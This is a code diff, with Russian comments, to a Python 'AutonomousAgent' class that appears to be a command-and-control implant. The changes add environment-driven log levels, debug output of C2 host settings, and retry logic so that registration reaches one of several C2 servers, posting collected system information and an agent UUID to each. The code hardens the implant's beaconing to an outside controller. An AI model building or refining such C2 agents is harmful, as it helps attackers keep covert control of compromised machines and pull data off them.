@@ -307,11 +307,26 @@ class AutonomousAgent:
         else:
             logger.warning(f"Config file '{config_file}' not found or not specified. Using default configuration.")
 
-        # Устанавливаем уровень логирования
-        log_level_str = config.get('log_level', 'INFO').upper()
+        # Устанавливаем уровень логирования: приоритет у переменной окружения
+        log_level_env = os.environ.get('LOG_LEVEL')
+        if log_level_env:
+             log_level_str = log_level_env.upper()
+             logger.info(f"Using log level from environment variable LOG_LEVEL: {log_level_str}")
+        else:
+             log_level_str = config.get('log_level', 'INFO').upper()
+             logger.info(f"Using log level from config file or default: {log_level_str}")
+            
+        # log_level_str = config.get('log_level', 'INFO').upper() # Старая строка
         log_level = getattr(logging, log_level_str, logging.INFO)
-        logging.getLogger().setLevel(log_level) # Устанавливаем глобальный уровень
-        self.logger.info(f"Log level set to {log_level_str}")
+        
+        # Применяем уровень ко всем существующим и будущим логгерам
+        logging.basicConfig(level=log_level, format='%(asctime)s - %(name)s - %(levelname)s - %(message)s')
+        # Убедимся, что и корневой логгер настроен
+        logging.getLogger().setLevel(log_level)
+        # И логгер текущего модуля
+        self.logger.setLevel(log_level)
+        
+        self.logger.info(f"Final effective log level set to {log_level_str}")
 
         return config
     
@@ -775,6 +790,11 @@ class AutonomousAgent:
 
     def _register_with_c2(self):
         """Попытка регистрации агента на одном из C2 серверов."""
+        # <<< START DEBUG LOGGING >>>
+        self.logger.debug(f"DEBUG: os.environ.get('C2_HOST') = {os.environ.get('C2_HOST')}")
+        self.logger.debug(f"DEBUG: os.environ.get('C2_PORT') = {os.environ.get('C2_PORT')}")
+        # <<< END DEBUG LOGGING >>>
+
         system_info = self._get_system_info()
         # Добавляем уникальный UUID агента
         system_info['agent_uuid'] = self.agent_uuid
@@ -796,7 +816,14 @@ class AutonomousAgent:
              logger.warning("C2_HOST or C2_PORT environment variables not set. Falling back to config file.")
 
         c2_servers_from_config = self.config.get('c2_servers', [])
+        # <<< START DEBUG LOGGING >>>
+        self.logger.debug(f"DEBUG: c2_servers_from_env = {c2_servers_from_env}")
+        self.logger.debug(f"DEBUG: c2_servers_from_config = {c2_servers_from_config}")
+        # <<< END DEBUG LOGGING >>>
         c2_servers = c2_servers_from_env or c2_servers_from_config # Приоритет у переменных окружения
+        # <<< START DEBUG LOGGING >>>
+        self.logger.debug(f"DEBUG: Final c2_servers list = {c2_servers}")
+        # <<< END DEBUG LOGGING >>>
 
         if not c2_servers:
             logger.warning("No C2 servers configured.")
@@ -807,34 +834,58 @@ class AutonomousAgent:
              random.shuffle(c2_servers)
 
         registration_success = False
-        for c2_url_base in c2_servers:
-            register_url = f"{c2_url_base}/agents/register"
-            try:
-                logger.info(f"Registering with C2: {register_url}")
-                # Устанавливаем connect timeout и read timeout
-                response = requests.post(register_url, json=system_info, timeout=(5, 10)) # 5 сек на коннект, 10 на чтение
-                response.raise_for_status() # Проверяем на ошибки HTTP
+        max_retries = 3  # Максимальное количество попыток регистрации
+        retry_delay = 5  # Задержка между попытками в секундах
+        retry_count = 0
+        
+        while retry_count < max_retries and not registration_success:
+            if retry_count > 0:
+                logger.info(f"Retrying registration (attempt {retry_count + 1}/{max_retries}) in {retry_delay} seconds...")
+                time.sleep(retry_delay)
+                # Увеличиваем задержку для следующей попытки (опционально)
+                # retry_delay *= 2 
 
-                result = response.json()
-                if result.get('status') == 'success':
-                    self.agent_id = result.get('agent_id') # Сохраняем ID, выданный C2
-                    logger.info(f"Successfully registered with C2 server {c2_url_base}. Agent ID: {self.agent_id}")
-                    registration_success = True
-                    break # Выходим из цикла при успехе
-                else:
-                    logger.warning(f"Registration failed on {c2_url_base}: {result.get('message', 'Unknown error')}")
+            retry_count += 1
+            
+            for c2_url_base in c2_servers:
+                # Проверяем перед следующей попыткой, если предыдущий C2 уже ответил успехом
+                if registration_success:
+                     break 
+                     
+                register_url = f"{c2_url_base}/register" # <--- Правильный URL без /agents/
+                try:
+                    logger.info(f"Registering with C2: {register_url}")
+                    response = requests.post(register_url, json=system_info, timeout=(5, 10))
+                    response.raise_for_status()
 
-            except requests.exceptions.ConnectionError as e:
-                 # Используем f-string для форматирования
-                 logger.error(f"Connection error registering with C2 server {register_url}: {e}")
-            except requests.exceptions.Timeout as e:
-                logger.warning(f"Timeout registering with C2 server {register_url}: {e}")
-            except requests.exceptions.RequestException as e:
-                 # Используем f-string
-                 logger.error(f"Error registering with C2 server {register_url}: {e}")
+                    result = response.json()
+                    if result.get('status') == 'success':
+                        self.agent_id = result.get('agent_id')
+                        logger.info(f"Successfully registered with C2 server {c2_url_base}. Agent ID: {self.agent_id}")
+                        registration_success = True
+                        break # Выходим из цикла C2 серверов при успехе
+                    else:
+                        logger.warning(f"Registration failed on {c2_url_base}: {result.get('message', 'Unknown error')}")
 
+                except requests.exceptions.ConnectionError as e:
+                    logger.error(f"Connection error registering with C2 server {register_url}: {e}")
+                    # Не выходим из цикла C2, пробуем следующий, если он есть
+                    # Но для retry цикла ConnectionError считается неудачной попыткой
+                    continue # Переходим к следующему C2 серверу (если есть)
+                except requests.exceptions.Timeout as e:
+                    logger.warning(f"Timeout registering with C2 server {register_url}: {e}")
+                    continue # Переходим к следующему C2 серверу
+                except requests.exceptions.RequestException as e:
+                    logger.error(f"Error registering with C2 server {register_url}: {e}")
+                    continue # Переходим к следующему C2 серверу
+            
+            # Если перебрали все C2 и не зарегистрировались, ждем перед следующей общей попыткой
+            if not registration_success and retry_count < max_retries and len(c2_servers) > 0:
+                 logger.warning(f"Failed to register with any configured C2 server on attempt {retry_count}. Waiting before retry...")
+
+        # Финальная проверка после всех попыток
         if not registration_success:
-            logger.warning("Failed to register with any C2 server.")
+            logger.warning(f"Failed to register with any C2 server after {max_retries} attempts.")
 
         return registration_success # Возвращаем статус регистрации
 
